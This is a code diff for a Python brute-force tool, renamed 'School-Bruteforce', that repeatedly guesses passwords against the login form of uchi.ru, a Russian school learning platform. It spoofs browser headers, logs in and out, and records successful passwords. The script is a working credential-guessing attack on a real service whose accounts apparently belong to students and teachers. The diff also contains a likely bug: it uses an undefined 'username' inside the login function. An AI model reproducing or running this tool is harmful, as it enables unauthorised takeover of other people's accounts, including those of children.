@@ -2,7 +2,7 @@ import requests, os, time, sys, json, re
 import urllib.parse
 from hashlib import md5
 
-title = " NG-Bruteforce v2.0.1"
+title = " School-Bruteforce v2.0.2"
 
 
 def ng_getauthdata(config):
@@ -61,12 +61,13 @@ def ng_trytologout(config, session):
     session.close()
 
 def ur_trytologin(session, login, password):
+    global logfile
     raw_page = session.get("https://uchi.ru").text.split("<")
     login_headers = {
         'Host': 'uchi.ru',
-        'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0',
+        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
         'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
-        'Accept-Language':'en-US,en;q=0.5',
+        'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
         'Accept-Encoding':'gzip, deflate, br',
         'Content-Type':'application/x-www-form-urlencoded',
         'Origin':'https://uchi.ru',
@@ -85,9 +86,30 @@ def ur_trytologin(session, login, password):
     raw_data = "utf8=✓&authenticity_token="+urllib.parse.quote(token)+"&next=%2Fhome&login="+urllib.parse.quote(login)+"&password="+urllib.parse.quote(password)
     response = session.post("https://uchi.ru", data=raw_data.encode(), headers=login_headers)
     if "Expires" in str(response.headers):
-        return True
+        ur_trytologout(session)
+        login_succ(username, password, logfile)
     else:
-        return False
+        print("Wrong: " + password)
+
+def ur_trytologout(session):
+    logout_headers = {
+        'Host':'uchi.ru',
+        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
+        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+        'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
+        'Accept-Encoding':'gzip, deflate, br',
+        'Connection':'keep-alive',
+        'Cookie':str(session.cookies.get_dict()).replace("{", "").replace("}", "").replace("': '", "=").replace(",", ";").replace("'", ""),
+        'Referer':'https://uchi.ru/profile/students',
+        'Upgrade-Insecure-Requests':'1',
+        'Sec-Fetch-Dest':'document',
+        'Sec-Fetch-Mode':'navigate',
+        'Sec-Fetch-User':'?1',
+        'TE':'trailers',
+    }
+    response = session.get('https://uchi.ru/logout', headers=logout_headers)
+    return response
+
 
 def login_succ(username, password, logfile): 
     print("Success: " + password)
@@ -151,9 +173,3 @@ elif mode=="2": # Учи.ру
         print("Username: " + username)
         for password in passwords:
             login_answer = ur_trytologin(session, username, password)
-            if login_answer==True:
-                login_succ(username, password, logfile)
-            elif login_answer==False:
-                print("Wrong: " + password)
-            else:
-                print("Unknown: " + login_answer)
